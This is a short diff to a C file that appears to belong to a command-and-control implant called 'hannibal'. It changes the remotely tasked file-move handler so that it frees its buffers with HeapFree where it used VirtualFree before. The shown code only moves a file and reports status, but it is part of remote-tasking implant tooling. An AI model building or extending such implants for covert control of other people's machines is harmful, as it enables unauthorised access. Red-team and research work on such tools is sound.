@@ -19,9 +19,9 @@ SECTION_CODE void cmd_mv(TASK t)
 
     if (attributes == INVALID_FILE_ATTRIBUTES) {
         hannibal_response(L"Src does not exist", t.task_uuid);
-        hannibal_instance_ptr->Win32.VirtualFree(mv->src_path, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(mv->dst_path, 0, MEM_RELEASE);
-        hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, mv->src_path);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, mv->dst_path);
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, t.cmd);
         return;
     }
 
@@ -31,9 +31,9 @@ SECTION_CODE void cmd_mv(TASK t)
         hannibal_response(L"Error", t.task_uuid);
     }
 
-    hannibal_instance_ptr->Win32.VirtualFree(mv->src_path, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(mv->dst_path, 0, MEM_RELEASE);
-    hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, mv->src_path);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, mv->dst_path);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, t.cmd);
 }
 
 #endif
